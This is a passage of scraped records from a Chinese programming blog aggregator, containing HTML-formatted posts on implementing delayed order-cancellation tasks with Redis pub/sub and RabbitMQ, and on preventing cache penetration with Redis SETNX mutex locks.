class=\"crayon-h\"> </span><span class=\"crayon-e\">JedisPubSub</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358ea177746052-31\"><span class=\"crayon-h\">        </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">href</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">'http://www.jobbole.com/members/wx610506454'</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">Override</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">a</span><span class=\"crayon-o\">&gt;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358ea177746052-32\"><span class=\"crayon-h\">        </span><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">onMessage</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">String</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">channel</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">String</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">message</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358ea177746052-33\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">System</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">out</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">println</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">System</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">currentTimeMillis</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">+</span><span class=\"crayon-s\">\"ms:\"</span><span class=\"crayon-o\">+</span><span class=\"crayon-v\">message</span><span class=\"crayon-o\">+</span><span class=\"crayon-s\">\"订单取消\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358ea177746052-34\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358ea177746052-35\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358ea177746052-36\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0067 seconds] -->\r\n<p>输出如下</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa930358ee636250518\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n1525096202813ms:OID0000000订单生成\r\n1525096202818ms:OID0000001订单生成\r\n1525096202824ms:OID0000002订单生成\r\n1525096202826ms:OID0000003订单生成\r\n1525096202830ms:OID0000004订单生成\r\n1525096202834ms:OID0000005订单生成\r\n1525096202839ms:OID0000006订单生成\r\n1525096205819ms:OID0000000订单取消\r\n1525096205920ms:OID0000005订单取消\r\n1525096205920ms:OID0000004订单取消\r\n1525096205920ms:OID0000001订单取消\r\n1525096205920ms:OID0000003订单取消\r\n1525096205920ms:OID0000006订单取消\r\n1525096205920ms:OID0000002订单取消</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358ee636250518-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358ee636250518-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358ee636250518-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358ee636250518-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358ee636250518-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358ee636250518-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358ee636250518-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358ee636250518-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358ee636250518-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358ee636250518-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358ee636250518-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358ee636250518-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358ee636250518-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358ee636250518-14\">14</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa930358ee636250518-1\"><span class=\"crayon-cn\">1525096202813ms</span><span class=\"crayon-o\">:</span><span class=\"crayon-i\">OID0000000</span>订单生成</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358ee636250518-2\"><span class=\"crayon-cn\">1525096202818ms</span><span class=\"crayon-o\">:</span><span class=\"crayon-i\">OID0000001</span>订单生成</div><div class=\"crayon-line\" id=\"crayon-5b4aa930358ee636250518-3\"><span class=\"crayon-cn\">1525096202824ms</span><span class=\"crayon-o\">:</span><span class=\"crayon-i\">OID0000002</span>订单生成</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358ee636250518-4\"><span class=\"crayon-cn\">1525096202826ms</span><span class=\"crayon-o\">:</span><span class=\"crayon-i\">OID0000003</span>订单生成</div><div class=\"crayon-line\" id=\"crayon-5b4aa930358ee636250518-5\"><span class=\"crayon-cn\">1525096202830ms</span><span class=\"crayon-o\">:</span><span class=\"crayon-i\">OID0000004</span>订单生成</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358ee636250518-6\"><span class=\"crayon-cn\">1525096202834ms</span><span class=\"crayon-o\">:</span><span class=\"crayon-i\">OID0000005</span>订单生成</div><div class=\"crayon-line\" id=\"crayon-5b4aa930358ee636250518-7\"><span class=\"crayon-cn\">1525096202839ms</span><span class=\"crayon-o\">:</span><span class=\"crayon-i\">OID0000006</span>订单生成</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358ee636250518-8\"><span class=\"crayon-cn\">1525096205819ms</span><span class=\"crayon-o\">:</span><span class=\"crayon-i\">OID0000000</span>订单取消</div><div class=\"crayon-line\" id=\"crayon-5b4aa930358ee636250518-9\"><span class=\"crayon-cn\">1525096205920ms</span><span class=\"crayon-o\">:</span><span class=\"crayon-i\">OID0000005</span>订单取消</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358ee636250518-10\"><span class=\"crayon-cn\">1525096205920ms</span><span class=\"crayon-o\">:</span><span class=\"crayon-i\">OID0000004</span>订单取消</div><div class=\"crayon-line\" id=\"crayon-5b4aa930358ee636250518-11\"><span class=\"crayon-cn\">1525096205920ms</span><span class=\"crayon-o\">:</span><span class=\"crayon-i\">OID0000001</span>订单取消</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358ee636250518-12\"><span class=\"crayon-cn\">1525096205920ms</span><span class=\"crayon-o\">:</span><span class=\"crayon-i\">OID0000003</span>订单取消</div><div class=\"crayon-line\" id=\"crayon-5b4aa930358ee636250518-13\"><span class=\"crayon-cn\">1525096205920ms</span><span class=\"crayon-o\">:</span><span class=\"crayon-i\">OID0000006</span>订单取消</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358ee636250518-14\"><span class=\"crayon-cn\">1525096205920ms</span><span class=\"crayon-o\">:</span><span class=\"crayon-i\">OID0000002</span>订单取消</div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0020 seconds] -->\r\n<p>可以明显看到3秒过后，订单取消了<br>\nps:redis的<strong>pub/sub</strong>机制存在一个硬伤，官网内容如下<br>\n<strong>原</strong>:Because Redis Pub/Sub is fire and forget currently there is no way to use this feature if your application demands reliable notification of events, that is, if your Pub/Sub client disconnects, and reconnects later, all the events delivered during the time the client was disconnected are lost.<br>\n<strong>翻</strong>: Redis的发布/订阅目前是即发即弃(fire and forget)模式的，因此无法实现事件的可靠通知。也就是说，如果发布/订阅的客户端断链之后又重连，则在客户端断链期间的所有事件都丢失了。<br>\n因此，方案二不是太推荐。当然，如果你对可靠性要求不高，可以使用。</p>\n<h4 id=\"优缺点-3\">优缺点</h4>\n<p>优点:(1)由于使用Redis作为消息通道，消息都存储在Redis中。如果发送程序或者任务处理程序挂了，重启之后，还有重新处理数据的可能性。<br>\n(2)做集群扩展相当方便<br>\n(3)时间准确度高<br>\n缺点:(1)需要额外进行redis维护</p>\n<h3 id=\"使用消息队列\">(5)使用消息队列</h3>\n<p>我们可以采用rabbitMQ的延时队列。RabbitMQ具有以下两个特性，可以实现延迟队列</p>\n<ul>\n<li>RabbitMQ可以针对Queue和Message设置 x-message-tt，来控制消息的生存时间，如果超时，则消息变为dead letter</li>\n<li>lRabbitMQ的Queue可以配置x-dead-letter-exchange 和x-dead-letter-routing-key（可选）两个参数，用来控制队列内出现了deadletter，则按照这两个参数重新路由。<br>\n结合以上两个特性，就可以模拟出延迟消息的功能,具体的，我改天再写一篇文章，这里再讲下去，篇幅太长。</li>\n</ul>\n<h4 id=\"优缺点-4\">优缺点</h4>\n<p>优点: 高效,可以利用rabbitmq的分布式特性轻易的进行横向扩展,消息支持持久化增加了可靠性。<br>\n缺点：本身的易用度要依赖于rabbitMq的运维.因为要引用rabbitMq,所以复杂度和成本变高</p>\n<h2 id=\"总结\">总结</h2>\n<p>本文总结了目前互联网中，绝大部分的延时任务的实现方案。希望大家在工作中能够有所收获。<br>\n其实大家在工作中，百分九十的人还是以业务逻辑为主，很少有机会能够进行方案设计。所以博主不推荐在分布式这块，花太多时间，应该看看《<a href=\"http://www.cnblogs.com/rjzheng/category/1205773.html\">手把手系列的文章</a>》。不过，鉴于现在的面试造火箭，工作拧螺丝现象太过严重，所以博主开始写《<a href=\"http://www.cnblogs.com/rjzheng/category/1204667.html\">分布式系列</a>》，最后来个小漫画娱乐一下。<br>\n<img src=\"http://jbcdn2.b0.upaiyun.com/2018/05/6078d20590382b70de9c85538e7c1831.png\" alt=\"image\"></p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114009\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114009votetotal\">2</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114009\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 5 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "tags": "IT技术,分布式,数据库", "url": "http://blog.jobbole.com/114009/", "url_obj_id": "9d318dfaa9e2e87c3a9c89f18682922d"}
{"front_img_url": ["http://jbcdn2.b0.upaiyun.com/2017/03/4bae6998d00f180d42c7da716e3d0bb2.jpg"], "title": "分布式之缓存击穿", "create_date": "2018/05/19 ·", "praise_num": 2, "fav_num": 4, "comment_num": 0, "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"http://www.cnblogs.com/rjzheng/p/8908073.html\">孤独烟</a>   </div><h2 id=\"什么是缓存击穿\">什么是缓存击穿</h2>\n<p>在谈论缓存击穿之前，我们先来回忆下从缓存中加载数据的逻辑，如下图所示<br>\n<img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/05/927e850b8c5ae23d93f46b212108ca38.png\" alt=\"image\"></p>\n<p>因此，如果黑客每次故意查询一个在缓存内必然不存在的数据，导致每次请求都要去存储层去查询，这样缓存就失去了意义。如果在大流量下数据库可能挂掉。这就是缓存击穿。<br>\n场景如下图所示:<br>\n<img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/05/416c99b6f355c9d20931df6027f4a21c.png\" alt=\"image\"></p>\n<p>我们正常人在登录首页的时候，都是根据userID来命中数据，然而黑客的目的是破坏你的系统，黑客可以随机生成一堆userID,然后将这些请求怼到你的服务器上，这些请求在缓存中不存在，就会穿过缓存，直接怼到数据库上,从而造成数据库连接异常。</p>\n<h2 id=\"解决方案\">解决方案</h2>\n<p>在这里我们给出三套解决方案，大家根据项目中的实际情况，选择使用.</p>\n<p>讲下述三种方案前，我们先回忆下redis的setnx方法</p>\n<p><strong>SETNX</strong> <strong>key</strong> <strong>value</strong></p>\n<p>将 key 的值设为 value ，当且仅当 key 不存在。</p>\n<p>若给定的 key 已经存在，则 SETNX 不做任何动作。</p>\n<p>SETNX 是『SET if Not eXists』(如果不存在，则 SET)的简写。</p>\n<p><strong>可用版本</strong>：&gt;= 1.0.0</p>\n<p><strong>时间复杂度：</strong> O(1)</p>\n<p><strong>返回值：</strong> 设置成功，返回 1。设置失败，返回 0 。</p>\n<p>效果如下</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93038eb1926047412\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nredis&gt; EXISTS job                # job 不存在\r\n(integer) 0\r\n\r\nredis&gt; SETNX job \"programmer\"    # job 设置成功\r\n(integer) 1\r\n\r\nredis&gt; SETNX job \"code-farmer\"   # 尝试覆盖 job ，失败\r\n(integer) 0\r\n\r\nredis&gt; GET job                   # 没有被覆盖\r\n\"programmer\"</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93038eb1926047412-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93038eb1926047412-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93038eb1926047412-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93038eb1926047412-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93038eb1926047412-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93038eb1926047412-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93038eb1926047412-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93038eb1926047412-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93038eb1926047412-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93038eb1926047412-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93038eb1926047412-11\">11</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93038eb1926047412-1\"><span class=\"crayon-v\">redis</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">EXISTS </span><span class=\"crayon-v\">job</span><span class=\"crayon-h\">                </span><span class=\"crayon-p\"># job 不存在</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93038eb1926047412-2\"><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">integer</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93038eb1926047412-3\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93038eb1926047412-4\"><span class=\"crayon-v\">redis</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">SETNX </span><span class=\"crayon-i\">job</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"programmer\"</span><span class=\"crayon-h\">    </span><span class=\"crayon-p\"># job 设置成功</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93038eb1926047412-5\"><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">integer</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93038eb1926047412-6\"> </div><div class=\"crayon-line\" id=\"crayon-5b4aa93038eb1926047412-7\"><span class=\"crayon-v\">redis</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">SETNX </span><span class=\"crayon-i\">job</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"code-farmer\"</span><span class=\"crayon-h\">   </span><span class=\"crayon-p\"># 尝试覆盖 job ，失败</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93038eb1926047412-8\"><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">integer</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93038eb1926047412-9\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93038eb1926047412-10\"><span class=\"crayon-v\">redis</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">GET </span><span class=\"crayon-v\">job</span><span class=\"crayon-h\">                   </span><span class=\"crayon-p\"># 没有被覆盖</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93038eb1926047412-11\"><span class=\"crayon-s\">\"programmer\"</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0012 seconds] -->\r\n<p></p>\n<h3 id=\"使用互斥锁\">1、使用互斥锁</h3>\n<p>该方法是比较普遍的做法，即，在根据key获得的value值为空时，先锁上，再从数据库加载，加载完毕，释放锁。若其他线程发现获取锁失败，则睡眠50ms后重试。</p>\n<p>至于锁的类型，单机环境用并发包的Lock类型就行，集群环境则使用分布式锁( redis的setnx)</p>\n<p>集群环境的redis的代码如下所示:</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93038ebb811198664\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nString get(String key) {  \r\n   String value = redis.get(key);  \r\n   if (value  == null) {  \r\n    if (redis.setnx(key_mutex, \"1\")) {  \r\n        // 3 min timeout to avoid mutex holder crash  \r\n        redis.expire(key_mutex, 3 * 60)  \r\n        value = db.get(key);  \r\n        redis.set(key, value);  \r\n        redis.delete(key_mutex);  \r\n    } else {  \r\n        //其他线程休息50毫秒后重试  \r\n        Thread.sleep(50);  \r\n        get(key);  \r\n    }  \r\n  }  \r\n}  </textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93038ebb811198664-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93038ebb811198664-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93038ebb811198664-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93038ebb811198664-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93038ebb811198664-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93038ebb811198664-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93038ebb811198664-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93038ebb811198664-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93038ebb811198664-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93038ebb811198664-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93038ebb811198664-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93038ebb811198664-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93038ebb811198664-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93038ebb811198664-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93038ebb811198664-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93038ebb811198664-16\">16</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93038ebb811198664-1\"><span class=\"crayon-t\">String</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">get</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">String</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">key</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93038ebb811198664-2\"><span class=\"crayon-h\">   </span><span class=\"crayon-t\">String</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">value</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">redis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">get</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">key</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93038ebb811198664-3\"><span class=\"crayon-h\">   </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">value</span><span class=\"crayon-h\">  </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">null</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93038ebb811198664-4\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">redis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">setnx</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">key_mutex</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"1\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93038ebb811198664-5\"><span class=\"crayon-h\">        </span><span class=\"crayon-c\">// 3 min timeout to avoid mutex holder crash  